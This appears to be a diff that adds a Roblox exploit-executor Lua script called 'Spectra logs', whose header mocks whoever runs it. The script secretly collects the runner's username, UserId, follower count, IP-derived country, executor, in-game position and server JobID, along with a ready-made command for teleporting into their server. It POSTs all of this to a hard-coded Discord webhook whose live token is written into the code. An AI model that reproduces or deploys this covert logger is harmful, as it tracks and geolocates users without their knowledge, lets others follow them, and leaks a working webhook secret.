@@ -1,0 +1,115 @@
+--[[
+    Spectra logs pega rpz hihih
+    Eu sou fodaaaaaaaaaaaaaaaaa
+    Seu lixoooooooooooooooooooo
+    N presta pra nadaaaaaaaaaaa
+
+
+--]]
+
+local HttpService = game:GetService('HttpService')
+local MarketplaceService = game:GetService('MarketplaceService')
+local Players = game:GetService('Players')
+local Stats = game:GetService("Stats")
+
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local rootPart = character:WaitForChild("HumanoidRootPart")
+
+-- 1. Informações de Identidade
+local userId = player.UserId
+local displayName = player.DisplayName 
+local username = player.Name       
+local accountAge = player.AccountAge
+local pos = rootPart.Position
+
+-- 2. Informações de Social (Amigos e Seguidores)
+local friendCount = "Erro"
+local followerCount = "Erro"
+
+pcall(function()
+    -- Amigos
+    friendCount = #Players:GetFriendsAsync(userId):GetCurrentPage()
+    -- Seguidores (Usando API do próprio Roblox via Proxy ou similar)
+    -- Nota: A maioria dos executores permite essa leitura direta
+    local socialUrl = "https://friends.roblox.com/v1/users/" .. userId .. "/followers/count"
+    local response = game:HttpGet(socialUrl)
+    local data = HttpService:JSONDecode(response)
+    followerCount = data.count or "0"
+end)
+
+-- 3. Informações do Servidor (Jogadores Atual/Max)
+local currentPlayers = #Players:GetPlayers()
+local maxPlayers = Players.MaxPlayers
+local serverPopulation = currentPlayers .. "/" .. maxPlayers
+
+-- 4. Localização (País)
+local country = "Desconhecido"
+pcall(function()
+    local response = game:HttpGet("http://ip-api.com/json/")
+    local data = HttpService:JSONDecode(response)
+    country = data.country or "Desconhecido"
+end)
+
+-- 5. Data e Hora Real
+local timestamp = os.date("%d/%m/%Y - %X")
+
+-- 6. Lógica de Servidor Público/Privado e Imagens
+local isPrivate = game.PrivateServerId ~= "" or game.PrivateServerOwnerId ~= 0
+local serverType = isPrivate and "Privado" or "Público"
+local embedImage = isPrivate and "https://i.postimg.cc/R0rHtzGn/sukuna-jjk-sukuna.gif" or "https://i.postimg.cc/R0rHtzGn/sukuna-jjk-sukuna.gif"
+
+-- 7. Preparação do Webhook
+local webhookData = {
+    embeds = {
+        [1] = {
+            title = '🔴 Spectra execução',
+            color = 16711680, -- Vermelho
+            thumbnail = {
+                url = 'https://www.roblox.com/headshot-thumbnail/image?userId=' .. userId .. '&width=150&height=150&format=png',
+            },
+            image = {
+                url = embedImage
+            },
+            fields = {
+                {name = '👤 Usuário/Display', value = "**" .. username .. "** (👑*" .. displayName .. "*)", inline = true},
+                {name = '🆔 UserId', value = tostring(userId), inline = true},
+                {name = '🌍 País do player', value = "📍" .. country, inline = true},
+                
+                {name = '📅 Idade da Conta', value = accountAge .. " dias", inline = true},
+
+                {name = '🎮 quandos players tem no servidor', value = serverPopulation, inline = true},
+                {name = '🔒 Tipo de Servidor público/privado', value = serverType, inline = true},
+                {name = '💻 Executor', value = identifyexecutor() or "Desconhecido", inline = true},
+                
+                {name = '📍 Posição do jogador quando ele executou', value = string.format("X: %.0f, Y: %.0f, Z: %.0f", pos.X, pos.Y, pos.Z), inline = false},
+                {name = '🗺️ Jogo/Place', value = MarketplaceService:GetProductInfo(game.PlaceId).Name .. " [" .. game.PlaceId .. "]", inline = false},
+                
+                {name = '🕒 Data/Hora', value = timestamp, inline = false},
+                {name = '🔑 JobID (Server)', value = "```" .. game.JobId .. "```", inline = false},
+                {
+                    name = '🌀 Teleporte para o servidor do player', 
+                    value = "\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "', game.Players.LocalPlayer)", 
+                    inline = false
+                },
+            },
+            footer = {
+                text = "Spectra sistem logs • by assure_TV"
+            }
+        },
+    },
+}
+
+-- 8. Envio do Webhook
+local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
+if request then
+    request({
+        Url = 'https://discord.com/api/webhooks/1475528399110799532/M1Adg0kFXPyJJfA7m20XyelDMofp88P8ermgQDxMC_Yq1oD_1wOTixDPZeNpz4MagpcN',
+        Method = 'POST',
+        Headers = {['Content-Type'] = 'application/json'},
+        Body = HttpService:JSONEncode(webhookData),
+    })
+    print('Log completo enviado com sucesso!')
+else
+    warn('Seu executor não suporta requisições HTTP (Webhook).')
+end
